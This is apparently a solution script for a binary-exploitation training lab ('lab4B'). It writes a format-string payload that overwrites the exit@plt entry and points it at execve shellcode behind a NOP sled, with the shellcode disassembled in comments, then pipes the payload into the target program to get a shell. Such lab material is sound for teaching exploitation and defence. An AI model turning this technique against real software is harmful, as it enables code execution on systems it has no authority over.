import struct,os
# Shellcode:
# 0:  31 c9                   xor    ecx,ecx
# 2:  f7 e1                   mul    ecx
# 4:  b0 0b                   mov    al,0xb
# 6:  bb 24 3a f8 b7          mov    ebx,0xb7f83a24
# b:  cd 80                   int    0x80
shellcode=b"\x31\xc9\xf7\xe1\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80"
f=open("/tmp/4Bpayload","wb")
target=struct.pack("<I",0x80499b8)#exit@plt
target1=struct.pack("<I",0x80499b8+2)
mod_target=b"%8$hn%7$13933p%6$hn"#try to overwrite exit@plt -> addr of shellcode
offset=100+49039
print_pre_mod="%5${}p".format(offset).encode()
f.write(target+b"AAAA"+target1+print_pre_mod+mod_target)# write 40 bytes
f.write(b"\x90"*(59-len(shellcode))+shellcode+b"\n")# Remeber: the last char will become 'null' char.
f.close()
os.system("(cat /tmp/4Bpayload;cat) | /levels/lab04/lab4B")
os.system("rm -f /tmp/4Bpayload")
